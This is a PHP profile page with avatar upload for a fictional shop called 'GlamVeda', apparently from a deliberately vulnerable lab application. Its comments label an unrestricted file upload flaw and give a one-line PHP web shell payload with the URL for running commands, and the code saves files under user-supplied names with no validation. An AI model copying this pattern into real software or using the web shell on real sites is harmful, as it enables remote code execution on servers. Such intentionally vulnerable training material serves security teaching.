<?php
// profile.php
// VULNERABILITY: Unrestricted File Upload (CWE-434)
// PoC: upload a file named shell.php containing: <?php system($_GET['cmd']); ?>
// Then visit /uploads/shell.php?cmd=id
// This works because: (1) no extension whitelist, (2) no MIME-type check,
// (3) uploads/ is served by Apache with PHP execution enabled (see setup.sh /
// .htaccess in uploads/, AllowOverride All in the vhost config)
session_start();
require 'db.php';
include 'header.php';

if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit;
}

$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['avatar'])) {
    // VULNERABLE: filename taken directly from user input, no extension/MIME validation
    $target = "uploads/" . $_FILES['avatar']['name'];

    if (move_uploaded_file($_FILES['avatar']['tmp_name'], $target)) {
        $message = "Avatar uploaded: " . htmlspecialchars($_FILES['avatar']['name']);
    } else {
        $message = "Upload failed.";
    }
}
?>
<!DOCTYPE html>
<html>
<head><title>Profile — GlamVeda</title></head>
<body>
    <h2>My Profile</h2>
    <p>Logged in as: <?= htmlspecialchars($_SESSION['username']) ?></p>

    <?php if ($message): ?><p><?= $message ?></p><?php endif; ?>

    <form method="POST" enctype="multipart/form-data">
        <label>Upload Avatar:</label>
        <input type="file" name="avatar" required><br>
        <button type="submit">Upload</button>
    </form>
</body>
</html>
